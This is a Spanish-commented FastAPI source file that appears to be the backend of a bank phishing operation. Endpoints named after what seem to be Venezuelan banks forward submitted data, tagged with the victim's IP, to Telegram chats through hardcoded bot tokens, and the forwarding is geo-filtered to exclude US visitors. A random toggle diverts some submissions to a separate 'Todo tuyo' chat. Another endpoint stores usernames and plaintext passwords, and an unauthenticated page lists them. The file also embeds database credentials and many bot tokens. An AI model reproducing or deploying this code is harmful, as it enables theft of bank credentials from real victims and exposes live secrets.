from fastapi import FastAPI, HTTPException, Request ,UploadFile
from fastapi import  File,  Form
from functools import partial
import shutil
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import requests
from fastapi.responses import HTMLResponse
from collections import deque
from pydantic import BaseModel
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response
import random
import base64
import psycopg2
from psycopg2.extras import RealDictCursor
from typing import Callable
from datetime import datetime, timedelta
import re
import httpx
import random

app = FastAPI()

# Configurar el middlewares CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost", "*"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
)

TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"

# Configuración sde asutenticac2iónsssss
AUTH_USERNAME = "gato"
AUTH_PASSWORD = "Gato1234@"
numeros_r = [4,6,9]
iprandom = {4,6,9}

# Conexión a la base de dsatsos sPosssstsgsreSQL
def get_db_connection():
    conn = psycopg2.connect(
        host="c80eji844tr0op.cluster-czrs8kj4isg7.us-east-1.rds.amazonaws.com",  # Cambia por tu host de PostgreSQL
        dbname="d143rurq7o5t2p",  # Cambia por tu nombre de base de datos
        user="ue751b26jiavcg",  # Cambia por tu usuario de base de datos
        password="p8e7fcd50cdab13f5db32213ade77645a5f410498f9abc010c3cc41dca00049b6",  # Cambia por tu contraseña de base de datos
        port=5432
    )
    return conn

# Inicializar base de datos si no existe
def init_db():
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS ip_numbers (
                            ip TEXT PRIMARY KEY,
                            number INTEGER
                        )''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS user_numbers (
                            username TEXT PRIMARY KEY,
                            number INTEGER
                        )''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS global_settings (
                id INTEGER PRIMARY KEY,
                is_active BOOLEAN DEFAULT FALSE
            )
        ''')

        cursor.execute('''
            INSERT INTO global_settings (id, is_active)
            VALUES (1, FALSE)
            ON CONFLICT (id) DO NOTHING
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs_usuarios (
                id SERIAL PRIMARY KEY,
                usuario TEXT,
                contrasena TEXT,
                ip TEXT,
                pais TEXT,
                fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

# Funciones para interactuar con las base de datos

def agregar_elemento_diccionario(ip, numero):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM ip_numbers WHERE ip = %s", (ip,))
    existing_ip = cursor.fetchone()
    
    if not existing_ip:
        cursor.execute("INSERT INTO ip_numbers (ip, number) VALUES (%s, %s)", (ip, numero))
        conn.commit()
    
    conn.close()

def usuariodiccionario(usuario, ip):
    with get_db_connection() as conn:
        cursor = conn.cursor()

        # Buscar el número asociado a la IP en la tabla ip_numbers
        cursor.execute("SELECT number FROM ip_numbers WHERE ip = %s", (ip,))
        result = cursor.fetchone()

        # Verificar si existe un número asociado a la IP
        if result:
            numero = result[0]

            # Insertar el usuario y el número en la tabla user_numbers o actualizar si ya existe
            cursor.execute(
                """
                INSERT INTO user_numbers (username, number) 
                VALUES (%s, %s) 
                ON CONFLICT (username) DO UPDATE SET number = EXCLUDED.number
                """,
                (usuario, numero)
            )
            conn.commit()
            return {"usuario": usuario, "numero": numero}
        
        else:
            # Si la IP no tiene número asociado, retornar un error o manejarlo según se necesite
            return {"error": "No se encontró un número asociado a la IP proporcionada."}


def obtener_numero(ip):
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT number FROM ip_numbers WHERE ip = %s", (ip,))
        row = cursor.fetchone()
        return row[0] if row else None

def obtener_usuario(usuario):
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT number FROM user_numbers WHERE username = %s", (usuario,))
        row = cursor.fetchone()
        return row[0] if row else None

def obtener_is_active():
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT is_active FROM global_settings WHERE id = 1")
        row = cursor.fetchone()
        return bool(row[0]) if row else False

def alternar_is_active():
    with get_db_connection() as conn:
        cursor = conn.cursor()
        
        # Obtener el valor actual de is_active
        cursor.execute("SELECT is_active FROM global_settings WHERE id = 1")
        row = cursor.fetchone()
        
        if row is not None:
            # Alternar el valor actual
            nuevo_valor = not row[0]
            
            # Actualizar el valor en la base de datos
            cursor.execute("UPDATE global_settings SET is_active = %s WHERE id = 1", (nuevo_valor,))
            conn.commit()
            return nuevo_valor
        else:
            raise ValueError("No se encontró la fila con id = 1 en la tabla global_settings.")

# Diccionario para registrar la última solicitud por IP
def agregar_elemento(cola, elemento):
    cola.append(elemento)

# Middleware para autenticación básica
class BasicAuthMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        if request.url.path.startswith("/docs") or request.url.path.startswith("/redoc"):
            auth = request.headers.get("Authorization")
            if not auth or not self._check_auth(auth):
                return Response("Unauthorized", status_code=401, headers={"WWW-Authenticate": "Basic"})
        response = await call_next(request)
        return response

    def _check_auth(self, auth: str) -> bool:
        try:
            scheme, credentials = auth.split()
            if scheme.lower() != "basic":
                return False
            decoded = base64.b64decode(credentials).decode("utf-8")
            username, password = decoded.split(":", 1)
            return username == AUTH_USERNAME and password == AUTH_PASSWORD
        except Exception:
            return False

app.add_middleware(BasicAuthMiddleware)

# Configuración de la tasa de solicitudes (1 solicitud cada 3 segundos)
#aqui se necesita modificar la tasa de solicitudes
class IPBlockMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        client_ip = request.client.host

        # Si la IP está en la lista de bloqueados, se devuelve un esrror 4s03
        if client_ip in baneado and client_ip != "179.6.6.254":
            return JSONResponse(
                status_code=403,
                content={"detail": "Acceso denegado, la ip esta fuera de servicio"}
            )
        # Si la IP no está bloqueada, se sigue con la solicitud
        if not (client_ip in iprandom):
            numero_random = random.randint(0, 9)
            agregar_elemento_diccionario(client_ip, numero_random)
        response = await call_next(request)
        return response

app.add_middleware(IPBlockMiddleware)
cola = deque(maxlen=20)
baneado = deque()
variable = False
# Función para contars cuántas veces aparece un elemento específico en la cola
def contar_elemento(cola, elemento):
    return cola.count(elemento)

def verificar_pais(ip):
    url = f"http://ipwhois.app/json/{ip}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            country = data.get('country_code', 'Unknown')  # Obtener el país o 'Unknown' si no está disponible
            if country in ['VE', 'CO', 'PE']:  # Verificar si es Venezuela, Colombia o Perú
                return True, country
            if country in ['US']:  # Verificar si es Venezuela, Colombia o Perú
                return False, country
            else:
                return True, country
        return False, 'Unknown'  # Retornar 'Unknown' si no se pudo obtener el país
    except Exception as e:
        raise HTTPException(status_code=500, detail="Error al verificar el país de la IP")

def enviar_telegram(mensaje, chat_id="-4826186479"):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": mensaje 
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            raise HTTPException(status_code=response.status_code, detail="Error al enviar mensaje a Telegram")
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=500, detail="Error de conexión al enviar mensaje a Telegram")
    

    
def enviar_telegram2(mensaje, chat_id="-4592050775",token="7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k" ):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": mensaje
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            raise HTTPException(status_code=response.status_code, detail="Error al enviar mensaje a Telegram")
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=500, detail="Error de conexión al enviar mensaje a Telegram 2")

def validar_contrasena(contrasena):
    # Expresión regular para verificar todos los requisitos
    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
    
    # Usamos re.match para verificar si la contraseña cumple con el patrón
    return bool(re.match(patron, contrasena))
class UpdateNumberRequest(BaseModel):
    numero: int

def editar_numero_ip2(ip: str):
    with get_db_connection() as conn:
        cursor = conn.cursor()

        # Verificar si la IP existe en la base de datos
        cursor.execute("SELECT * FROM ip_numbers WHERE ip = %s", (ip,))
        if cursor.fetchone() is None:
            raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")

        # Actualizar el número de la IP
        cursor.execute("UPDATE ip_numbers SET number = %s WHERE ip = %s", (0, ip))
        conn.commit()

    return {"message": f"Número de la IP {ip} actualizado a {0}"}

# Endpoint para editar el número de un usuario específico
def editar_numero_usuario2(usuario: str):
    with get_db_connection() as conn:
        cursor = conn.cursor()

        # Verificar si el usuario existe en la base de datos
        cursor.execute("SELECT * FROM user_numbers WHERE username = %s", (usuario,))
        if cursor.fetchone() is None:
            raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")

        # Actualizar el número del usuario
        cursor.execute("UPDATE user_numbers SET number = %s WHERE username = %s", (0, usuario))
        conn.commit()

    return {"message": f"Número del usuario {usuario} actualizado a {0}"}

@app.get("/")
def read_root():
    return {"message": "API funcionando correctamente!"}
#
@app.get("/mostrar_cola")
async def mostrar_cola():
    """
    Endpoint para mostrar los elementos actuales de la cola.
    """
    return {"estado_cola": list(baneado)}
@app.get("/limpiar_cola")
async def limpiar_cola():
    """
    Endpoint para limpiar la cola 'baneado'.
    """
    baneado.clear()
    return {"message": "La cola ha sido limpiada con éxito", "estado_cola": list(baneado)}

@app.post("/guardar_datos")
async def guardar_datos(usuario: str = Form(...), contra: str = Form(...), request: Request = None):
    ip = request.client.host
    permitido, pais = verificar_pais(ip)

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO logs_usuarios (usuario, contrasena, ip, pais) VALUES (%s, %s, %s, %s)",
            (usuario, contra, ip, pais)
        )
        conn.commit()
    return {
        "message": "Datos guardados correctamente",
        "ip": ip,
        "pais": pais
    }

@app.get("/ver_datos", response_class=HTMLResponse)
async def ver_datos():
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT usuario, contrasena, ip, pais, fecha FROM logs_usuarios ORDER BY fecha DESC")
        registros = cursor.fetchall()
    
    html = """
    <html>
    <head><title>Registros de Usuarios</title></head>
    <body>
        <h2>Listado de registros</h2>
        <table border="1">
            <tr><th>Usuario</th><th>Contraseña</th><th>IP</th><th>País</th><th>Fecha</th></tr>
    """
    for usuario, contrasena, ip, pais, fecha in registros:
        html += f"<tr><td>{usuario}</td><td>{contrasena}</td><td>{ip}</td><td>{pais}</td><td>{fecha}</td></tr>"
    
    html += "</table></body></html>"
    return HTMLResponse(content=html)

# Endpoint para obtener todos los ssusuarios sy sus números
@app.get("/usuarios/")
async def obtener_usuarios():
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT username, number FROM user_numbers")
        usuarios = cursor.fetchall()
        
    # Si no hay usuarios, devolver un mensaje adecuado
    if not usuarios:
        return {"message": "No se encontraron usuarios en la base de datos."}
    
    return {"usuarios": [{"usuario": usuario, "numero": numero} for usuario, numero in usuarios]}
# Endpoint para obtener el valdor actual de is_active
@app.get("/is_active/")
async def obtener_estado_actual():
    estado = obtener_is_active()
    if estado is None:
        return {"message": "El valor de is_active no está configurado en la base de datos."}
    return {"is_active": estado}


@app.post("/toggle/")
async def alternar_estado():
    try:
        nuevo_estado = alternar_is_active()
        return {"message": "El valor de is_active se ha alternado exitosamente.", "is_active": nuevo_estado}
    except ValueError as e:
        return {"error": str(e)}
# Endpoint para obtener todas las IPs y sus números
@app.get("/ips/")
async def obtener_ips():
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT ip, number FROM ip_numbers")
   

        ips = cursor.fetchall()
        
    # Si no hay IPs, devolver un mensaje adecuado
    if not ips:
        return {"message": "No se encontraron IPs en la base de datos."}
    
    return {"ips": [{"ip": ip, "numero": numero} for ip, numero in ips]}

# Iniciar la base de datos


# Modelo para la solicitud de edición de número
class UpdateNumberRequest(BaseModel):
    numero: int

# Endpoint para editar el número de una IP específica



@app.put("/editar-ip/{ip}")
async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
    with get_db_connection() as conn:
        cursor = conn.cursor()

        # Verificar si la IP existe en la base de datos
        cursor.execute("SELECT * FROM ip_numbers WHERE ip = %s", (ip,))
        if cursor.fetchone() is None:
            raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")

        # Actualizar el número de la IP
        cursor.execute("UPDATE ip_numbers SET number = %s WHERE ip = %s", (request_data.numero, ip))
        conn.commit()

    return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}

# Endpoint para editar el número de un usuario específico
@app.put("/editar-usuario/{usuario}")
async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest):
    with get_db_connection() as conn:
        cursor = conn.cursor()

        # Verificar si el usuario existe en la base de datos
        cursor.execute("SELECT * FROM user_numbers WHERE username = %s", (usuario,))
        if cursor.fetchone() is None:
            raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")

        # Actualizar el número del usuario
        cursor.execute("UPDATE user_numbers SET number = %s WHERE username = %s", (request_data.numero, usuario))
        conn.commit()

    return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}

def clear_db():
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM ip_numbers")
        cursor.execute("DELETE FROM user_numbers")
        conn.commit()

endpoint_configs = [
    {
        "path": "/bdv1/",
        "chat_id": "7224742938",
        "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"
    },
    {
        "path": "/bdv2/",
        "chat_id": "7528782002",
        "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"
    },
    {
        "path": "/bdv3/",
        "chat_id": "7805311838",
        "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"
    },
    {
        "path": "/bdv4/",
        "chat_id": "7549787135",
        "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"
    },
    {
        "path": "/bdv5/",
        "chat_id": "7872284021",
        "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"
    },
    {
        "path": "/bdv6/",
        "chat_id": "7815697126",
        "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"
    },
    {
        "path": "/provincial1/",
        "chat_id": "7224742938",
        "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"
    },
    {
        "path": "/provincial2/",
        "chat_id": "7528782002",
        "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"
    },
    {
        "path": "/provincial3/",
        "chat_id": "7805311838",
        "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"
    },
    {
        "path": "/provincial4/",
        "chat_id": "7549787135",
        "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"
    },
    {
        "path": "/provincial5/",
        "chat_id": "7872284021",
        "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"
    },
    {
        "path": "/provincial6/",
        "chat_id": "7815697126",
        "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"
    },
    {
        "path": "/internacional/",
        "chat_id": "7098816483",
        "bot_id": "7785368338:AAEbLAK_ts6KcRbbnOeu6_XVrCZV46AVJTc"
    },
    {
        "path": "/internacional2/",
        "chat_id": "6775367564",
        "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"
    },
    {
        "path": "/maikelhot/",
        "chat_id": "-4816573720",
        "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"
    },
    {
        "path": "/wts1/",
        "chat_id": "5711521334",
        "bot_id": "8294930756:AAHh3iZQzH1RweVl5iMaluyHj0h-mT131mI"
    },
    {
        "path": "/wts2/",
        "chat_id": "7883492995",
        "bot_id": "8116183285:AAEUuHD9yv8_O3ofS9c11Ndq_VSUBXoZKwo"
    },
]


class IPRequest(BaseModel):
    ip: str

@app.post("/verificar_spam_ip")
async def verificar_spam_ip(data: IPRequest):
    ip = data.ip.strip()
    agregar_elemento(cola, ip)
    repeticiones = contar_elemento(cola, ip)

    if repeticiones > 8:
        if ip not in baneado:
            baneado.append(ip)
        return {
            "ip": ip,
            "repeticiones": repeticiones,
            "spam": True,
            "mensaje": "IP detectada como spam y bloqueada"
        }
    else:
        return {
            "ip": ip,
            "repeticiones": repeticiones,
            "spam": False,
            "mensaje": "IP aún no considerada spam"
        }
    
class DynamicMessage(BaseModel):
    mensaje: str


async def handle_dynamic_endpoint(config, request_data: DynamicMessage, request: Request):
    client_ip = request.client.host
    agregar_elemento(cola, client_ip)
    numeror = obtener_numero(client_ip)

    if contar_elemento(cola, client_ip) > 8:
        baneado.append(client_ip)
        raise HTTPException(status_code=429, detail="Has sido bloqueado temporalmente.")

    permitido, pais = verificar_pais(client_ip)
    mensaje = request_data.mensaje

    if permitido and pais != "US":
        if obtener_is_active() and (numeror in numeros_r and pais != "US"):
            enviar_telegram(mensaje +f" - IP: {client_ip} - {config['path']} Todo tuyo","-4931572577")
        else:
            enviar_telegram(mensaje + f" - IP: {client_ip} - {config['path']}")
            enviar_telegram2(mensaje, config["chat_id"], config["bot_id"])
        return {"mensaje_enviado": True}
    else:
        raise HTTPException(status_code=400, detail=f"Acceso denegado desde {pais}")
    
for config in endpoint_configs:
    app.add_api_route(
        path=config["path"],
        endpoint=partial(handle_dynamic_endpoint, config),
        methods=["POST"]
    )


# Endpoint para limpiar la base de datos
@app.post('/clear_db')
def clear_db_endpoint():
    try:
        clear_db()
        return {"message": f"Se borro correctamente"}
    except Exception as e:
        return {"message": f"No se borro"}



init_db()
